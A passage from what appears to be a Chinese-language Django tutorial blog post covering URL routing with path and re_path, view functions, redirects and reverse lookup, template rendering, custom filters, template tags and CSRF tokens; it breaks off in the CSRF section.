        <content type="html"><![CDATA[<h2 id="Django-带参数的路由"><a href="#Django-带参数的路由" class="headerlink" title="Django 带参数的路由"></a>Django 带参数的路由</h2><h3 id="path对象"><a href="#path对象" class="headerlink" title="path对象"></a>path对象</h3><p>Django使用path对象来定义路由列表，path有四个参数：</p><ul><li>模式串：匹配用户请求路径的字符串</li><li>视图函数：匹配上用户请求路径后调用的视图函数</li><li>kwaergs：可选参数，需要额外传递的参数，是一个字典</li><li>名称(name)：给路由命名，在代码中可以使用name进行方向解析(由name获取用户请求路径)</li></ul><p>当path中模式串不能满足你的路由规则，还可以使用re_path对象，re_path对象中模式串是正则表达式，其他三个参数和path对象一致。</p><h3 id="path注意"><a href="#path注意" class="headerlink" title="path注意"></a>path注意</h3><ul><li>Django从上往下进行匹配，一旦匹配成功就返回</li><li>一个视图函数可以有多个模式匹配</li><li>模式前面不需要加’&#x2F;‘</li><li>如果匹配失败，则引起异常，Django会调用错误处理视图函数(关闭DEBUG模式)</li></ul><h3 id="path匹配规则"><a href="#path匹配规则" class="headerlink" title="path匹配规则"></a>path匹配规则</h3><ul><li>str 字符串参数可以匹配除&#x2F;和空字符的其他字符串</li><li>int 匹配0和整整数，视图函数的参数将得到一个整型值</li><li>slug 匹配由数字、字母、和_组成的字符串参数</li><li>path 匹配任何非空字符串，包括&#x2F;</li></ul><p>str写法：<code>path(&#39;user/&#39;,include(&quot;App.urls&quot;)),</code><br>匹配成功：<code>http://127.0.0.1:8000/user/</code><br>匹配失败：<code>http://127.0.0.1:8000/login/</code></p><p>int写法：<code>path(&#39;show/&lt;int:age&gt;/&#39;,views.show,name=&quot;show&quot;)</code><br>如果匹配字符串写了参数，在views里定义函数就需要参数来接收：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">request,age</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="built_in">str</span>(age))</span><br></pre></td></tr></table></figure><p>匹配成功：<code>http://127.0.0.1:8000/user/show/90/</code><br>匹配失败：<code>http://127.0.0.1:8000/user/show/ac/</code></p><p>slug写法：<code>path(&#39;list/&lt;slug:name&gt;/&#39;,views.list,name=&quot;list&quot;),</code><br>views：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">list</span>(<span class="params">request,name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(name))</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(name)</span><br></pre></td></tr></table></figure><p>只要list&#x2F;后是大小写字母、数字、下划线、-都可以匹配成功<br>匹配成功：<code>http://127.0.0.1:8000/user/list/A1_/</code><br>匹配失败：<code>http://127.0.0.1:8000/user/list/A1.</code></p><p>path写法:<code>path(&#39;path/&lt;path:path&gt;/&#39;,views.path,name=&quot;path&quot;),</code><br>views：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">path</span>(<span class="params">request,path</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(path)</span><br></pre></td></tr></table></figure><p>该类型匹配除空格外的所有字符串。</p><h3 id="re-path"><a href="#re-path" class="headerlink" title="re_path"></a>re_path</h3><p>在re_path中，()部分是正则的组，Django在进行url匹配时，就会自动把匹配成功的内容，作为参数传递给视图函数。</p><p>re_path无参数匹配手机号：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#urls路由，无参数</span></span><br><span class="line">re_path(<span class="string">r&#x27;^phone/(1[3-9]\d&#123;9&#125;)/$&#x27;</span>,views.phone,name=<span class="string">&quot;phone&quot;</span>),</span><br><span class="line"><span class="comment">#views函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phone</span>(<span class="params">requestn,phone</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(phone)</span><br></pre></td></tr></table></figure><p>re_path有参数匹配手机号：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#urls路由，有参数：tel，使用?P标志参数</span></span><br><span class="line">re_path(<span class="string">r&#x27;^phone/(?P&lt;tel&gt;1[3-9]\d&#123;9&#125;)/$&#x27;</span>,views.tel,name=<span class="string">&quot;tel&quot;</span>),</span><br><span class="line"><span class="comment">#views函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tel</span>(<span class="params">request,tel</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(tel)</span><br></pre></td></tr></table></figure><h2 id="Django-视图"><a href="#Django-视图" class="headerlink" title="Django 视图"></a>Django 视图</h2><p>视图本质上是一个函数(类)。这个函数第一个参数的类型时Httpreuest(Djiango传参);它返回一个HttpResponse实例。为了使一个Python的函数成为一个Django可以识别的视图，它必须满足这两个条件。</p><p>视图作用：接收并处理请求，调用模型和模板，响应请求</p><ul><li>响应模板</li><li>重定向</li><li>直接响应字符串</li><li>响应错误模板</li><li>json数据</li></ul><h3 id="HttpRequest"><a href="#HttpRequest" class="headerlink" title="HttpRequest"></a>HttpRequest</h3><p>HttpRequest是从web服务器传递过来的请求对象，经过Django框架封装产生的，封装了原始的Http请求。</p><ul><li>服务器接收到Http请求后，Django框架会自动根据服务器传递的环境变量创建HttpRequest对象</li><li>视图的第一个参数必须是HttpRequest类型的对象</li><li>在Django.http模块中定义了HttpPeruest对象的API</li><li>使用HttpRequest对象的不同属性值，可以获取请求中多种信息</li></ul><p>常用类型都可以使用这样的方式获取：<br>获取COOKIES数据：<code>print(request.COOKIES)</code><br>获取POST的username的值：<code>print(request.GET.get(&#39;username&#39;))</code><br>获取POST的username数组字典：<code>print(request.GET.getlist(&#39;username&#39;))</code></p><p>QuertDict&#x3D;&gt;Dict：<br><code>print(request.GET.dict())</code></p><h3 id="HttpResponse"><a href="#HttpResponse" class="headerlink" title="HttpResponse"></a>HttpResponse</h3><p>每一个视图函数必须返回一个响应对象，HttpResponse对象由程序员创建并返回。</p><table><thead><tr><th align="center">参数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">content</td><td align="center">字节字符串</td></tr><tr><td align="center">charset</td><td align="center">字符编码</td></tr><tr><td align="center">status_code</td><td align="center">Http状态码</td></tr><tr><td align="center">conten_type</td><td align="center">指定输出的MIME类型</td></tr></tbody></table><h4 id="不调用模板"><a href="#不调用模板" class="headerlink" title="不调用模板"></a>不调用模板</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">request</span>):</span><br><span class="line">    res = HttpResponse()</span><br><span class="line">    res.content = <span class="string">b&#x27;Hello Wolrd&#x27;</span></span><br><span class="line">    res.content_type = <span class="string">&#x27;text/html&#x27;</span></span><br><span class="line">    res.status_code = <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="调用模块返回"><a href="#调用模块返回" class="headerlink" title="调用模块返回"></a>调用模块返回</h4><p>一般使用render函数返回，render只是HttpResponse的包装，还是会返回一个HttpResponse对象。</p><table><thead><tr><th align="center">参数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">request</td><td align="center">HttpRequest的request参数</td></tr><tr><td align="center">template_name</td><td align="center">HTTP渲染模板</td></tr><tr><td align="center">context</td><td align="center">渲染的字典文件，默认为空</td></tr><tr><td align="center">content_type</td><td align="center">MIME类型，用于生成文档</td></tr><tr><td align="center">status</td><td align="center">Http响应码，默认200</td></tr></tbody></table><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>使用redirect函数来对网页进行重定向到网站首页。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">red</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3><p>通过name取得路由表地址，首先在路由表”urls.py”中设置路由命名空间：<code>app_name = &quot;App&quot;</code><br>调用的时候使用”命名空间:路由名称”调用，实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># urls.py</span></span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, re_path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> App <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">app_name = <span class="string">&quot;App&quot;</span></span><br><span class="line">urlpatterns = (</span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.hoxme, name=<span class="string">&#x27;home&#x27;</span>),</span><br><span class="line">    path(<span class="string">&#x27;post/&#x27;</span>, views.post, name=<span class="string">&#x27;post&#x27;</span>),</span><br><span class="line">    path(<span class="string">&#x27;red/&#x27;</span>, views.red, name=<span class="string">&#x27;red&#x27;</span>),</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># views.py</span></span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, redirect</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> reverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hoxme</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Home&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">request</span>):</span><br><span class="line">    res = HttpResponse(<span class="string">&quot;Hello Django&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">red</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">print</span>(reverse(<span class="string">&quot;App:post&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;App:post&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有参调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># urls.py</span></span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, re_path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> App <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">app_name = <span class="string">&quot;App&quot;</span></span><br><span class="line">urlpatterns = (</span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.hoxme, name=<span class="string">&#x27;home&#x27;</span>),</span><br><span class="line">    path(<span class="string">&#x27;post/&lt;name&gt;/&lt;age&gt;/&#x27;</span>, views.post, name=<span class="string">&#x27;post&#x27;</span>),</span><br><span class="line">    path(<span class="string">&#x27;red/&#x27;</span>, views.red, name=<span class="string">&#x27;red&#x27;</span>),</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># views.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">request,name,age</span>):</span><br><span class="line">    res = HttpResponse(<span class="string">&quot;Hello,&#123;&#125;&lt;br&gt;你是&#123;&#125;岁吗？&quot;</span>.<span class="built_in">format</span>(name,age))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">red</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;App:post&quot;</span>,kwargs=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;Lili&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;20&#x27;</span>&#125;))</span><br></pre></td></tr></table></figure><h3 id="错误视图"><a href="#错误视图" class="headerlink" title="错误视图"></a>错误视图</h3><p>Django内置了处理HTTP错误的视图(在django.views.defaults包下),主要错误视图包括：</p><ul><li>403错误：permission_denied (拒绝访问)</li><li>404错误：page_not_found (文件不存在)</li><li>500错误：server_error (服务器内部错误)</li></ul><p>如果开启DEBUG模式，出错了Django会调用默认模板，如果DEBUG&#x3D;False；在模板路径下创建404.html、500.html、403.heml，出错后Django会自动调用该模板。</p><h2 id="Django-模板"><a href="#Django-模板" class="headerlink" title="Django 模板"></a>Django 模板</h2><p>模板用于快速生成动态页面返回给客户端，模板是一个文本。用于分离文档的表现形式和内容。模板定义了占位符以及各种用于规范文档该如何显示的模块标签。模板通常是用于产生HTML，但是Django的模板也能产生任何基于文本格式的文档。模板包含两部分：</p><ul><li>HTML代码</li><li>模板代码</li></ul><h3 id="模板位置"><a href="#模板位置" class="headerlink" title="模板位置"></a>模板位置</h3><ul><li>在应用中建立templates目录，优点是不需要注册，缺点是多个应用的时候不能复用页面</li><li>第二种是放在工程的目录下，优点是如果有多个应用，可以调用相同的页面，需要注册</li></ul><p>需要修改项目的配置文件setings.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;BACKEND&#x27;</span>: <span class="string">&#x27;django.template.backends.django.DjangoTemplates&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;DIRS&#x27;</span>: [os.path.join(BASE_DIR, <span class="string">&#x27;templates&#x27;</span>)], <span class="comment">#模板文件夹路径</span></span><br><span class="line">        <span class="string">&#x27;APP_DIRS&#x27;</span>: <span class="literal">True</span>, <span class="comment">#是否在应用目录下查找模板文件</span></span><br><span class="line">        <span class="string">&#x27;OPTIONS&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;context_processors&#x27;</span>: [</span><br><span class="line">                <span class="string">&#x27;django.template.context_processors.debug&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;django.template.context_processors.request&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;django.contrib.auth.context_processors.auth&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;django.contrib.messages.context_processors.messages&#x27;</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>渲染方式：</p><ul><li>loader 先加载模板，再进行渲染，好处是多次渲染是不用重新加载</li><li>render 不用加载模板，自动加载，每次渲染都要重新加载一次模板</li></ul><h4 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    temp = loader.get_template(<span class="string">&quot;user/index.html&quot;</span>) <span class="comment">#加载模板</span></span><br><span class="line">    res = temp.render(context=&#123;<span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;loader加载&#x27;</span>&#125;) <span class="comment">#渲染模板</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(res)</span><br></pre></td></tr></table></figure><h4 id="render"><a href="#render" class="headerlink" title="render"></a>render</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&#x27;user/index.html&#x27;</span>,context=&#123;<span class="string">&#x27;var&#x27;</span>:<span class="string">&#x27;render自动加载后渲染&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h3><p>Django模板中包括两部分：变量和内置标签。变量会在模板渲染时被其值代替，内置标签负责逻辑控制。</p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4>变量在模板中的表示为:{{ 变量名 }},变量名就是 render中 context中的键。变量可以基本类型中的数值、字符串、布尔,也可以是字典、对象、列表等。 django提供了点号来访问复杂数据结构。- 列表、元组的元素可使用索引引用，不能使用负索引，语法：变量.索引- 字典：字典变量.key- 对象：对象.属性 对象.方法名(方法不能有参数)当模板系统在变量名中遇到点时，按照以下顺序尝试进行查找：- 字典类型查找- 属性查找- 方法查找- 列表类型索引如果模板中引用变量未传值，则会被置为空，不会报错，除非你对其进行了操作。#### 过滤器过滤器是在变量显示之前修改它的值得一个方法，过滤器使用管道符。过滤器可以串联调用> {{ 变量|方法 }}> 内置常见过滤器方法：![](https://img.xpctf.cn/img/20201015093838.png)- 自定义过滤器内置过滤器功能有限，如果不能满足需求，可以自己定义过滤器。- 在应用(app)里创建一个包，templatetags,包名指定的- 在包里创建一个自定义py文件<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立模板对象</span></span><br><span class="line">register = template.Library()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册一个过滤器，@符号是修饰符</span></span><br><span class="line"><span class="meta">@register.filter(<span class="params">name=<span class="string">&#x27;sub1&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub1</span>(<span class="params">value,num</span>): <span class="comment">#参数最多俩个</span></span><br><span class="line">    <span class="keyword">return</span> value - num</span><br></pre></td></tr></table></figure>调用需要在模板里加载自定义过滤器：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load mytag %&#125; &#123;# 加载自定义过滤器 #&#125;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>自定义过滤器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; var|sub1:5 &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>#### 内建标签> 语法：{% tag %}> <ol><li>if标签</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> express1 %&#125;</span><br><span class="line">    &#123;<span class="comment"># 为真执行 #&#125;</span></span><br><span class="line">&#123;% <span class="keyword">elif</span> express2 %&#125;</span><br><span class="line">    &#123;<span class="comment"># 为真执行 #&#125;</span></span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">    &#123;<span class="comment"># 为假执行 #&#125;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><ul><li><p>if表达式中使⽤以下运算符（优先级从⾼到低）： </p><ul><li>&lt; &gt;&#x3D; &lt;&#x3D; &#x3D;&#x3D; !&#x3D;</li><li>is、is not</li><li>not</li><li>and</li><li>or</li></ul></li><li><p>不要在表达式中使⽤（），可以使⽤if嵌套实现功能 </p></li><li><p>不⽀持 if 3 &lt; b &lt; 5这种写法</p></li></ul><ol start="2"><li>for</li></ol><ul><li><p>遍历可迭代对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> y%&#125;</span><br><span class="line"> <span class="comment">#代码块</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></li><li><p>反向迭代(reversed)</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> value <span class="keyword">in</span> c [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>] <span class="built_in">reversed</span> %&#125;</span><br><span class="line"> &lt;span&gt;&#123;&#123; value &#125;&#125;---&lt;/span&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ul><li>empty 当可迭代对象为空或不存在时执⾏，否则不执⾏</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> value <span class="keyword">in</span> c %&#125;</span><br><span class="line"> &lt;span&gt;&#123;&#123; value &#125;&#125;---&lt;/span&gt;</span><br><span class="line">&#123;% empty %&#125;</span><br><span class="line"> 数据不存在</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ul><li>字典迭代</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = &#123;<span class="string">&#x27;a1&#x27;</span>:<span class="number">20</span>,<span class="string">&#x27;b1&#x27;</span>:<span class="number">40</span>&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> k,v <span class="keyword">in</span> e.items %&#125;</span><br><span class="line"> &lt;div&gt;&#123;&#123; k &#125;&#125;---&#123;&#123; v &#125;&#125;&lt;/div&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">变量名称</th><th align="center">变量说明</th></tr></thead><tbody><tr><td align="center">forloop.counter</td><td align="center">获取迭代的索引 从1开始</td></tr><tr><td align="center">forloop.counter0</td><td align="center">获取迭代的索引 从0开始</td></tr><tr><td align="center">forloop.revcounter</td><td align="center">迭代的索引从最⼤递减到1</td></tr><tr><td align="center">forloop.revcounter0</td><td align="center">迭代的索引从最⼤递减到0</td></tr><tr><td align="center">forloop.first</td><td align="center">是否为第⼀次迭代</td></tr><tr><td align="center">forloop.last</td><td align="center">是否为最后⼀次迭代</td></tr><tr><td align="center">forloop.parentloop</td><td align="center">获取上层的迭代对象</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> c %&#125;</span><br><span class="line"> &lt;li&gt;&#123;&#123; forloop.first &#125;&#125;&lt;/li&gt;</span><br><span class="line"> &lt;li&gt;&#123;&#123; forloop.last &#125;&#125;&lt;/li&gt;</span><br><span class="line"> &lt;li&gt;&#123;&#123; forloop.counter &#125;&#125;&lt;/li&gt;</span><br><span class="line"> &lt;li&gt;&#123;&#123; forloop.counter0 &#125;&#125;&lt;/li&gt;</span><br><span class="line"> &lt;li&gt;&#123;&#123; forloop.revcounter &#125;&#125;&lt;/li&gt;</span><br><span class="line"> &lt;li&gt;&#123;&#123; forloop.revcounter0 &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>ifequal&#x2F;ifnotequal</li></ol><p> ⽤于判断两个值相等或不等的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ifequal var var %&#125;</span><br><span class="line">&#123;% endifequal %&#125;</span><br><span class="line">&#123;% ifnotequal var var %&#125;</span><br><span class="line">&#123;% endifnotequal %&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>注释</li></ol><ul><li>单⾏注释</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment"># 注释内容 #&#125;</span></span><br></pre></td></tr></table></figure><ul><li>多⾏注释</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% comment %&#125;</span><br><span class="line"> ...</span><br><span class="line">&#123;% endcomment %&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>跨站请求伪造 csrf</li></ol><p>防⽌⽹站受第三⽅服务器的恶意攻击（确定表单到底是不是本⽹站的表单传递过来 的）。csrf相当于在表达中增加了⼀个隐藏的input框，⽤于向服务器提交⼀个唯⼀ 的随机字符串⽤于服务器验证表单是否是本服务器的表单。</p><p>编辑settings.py开启csrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line"> <span class="string">&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>表单调用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"> &#123;% csrf_token %&#125;</span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>全站禁⽤csrf：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 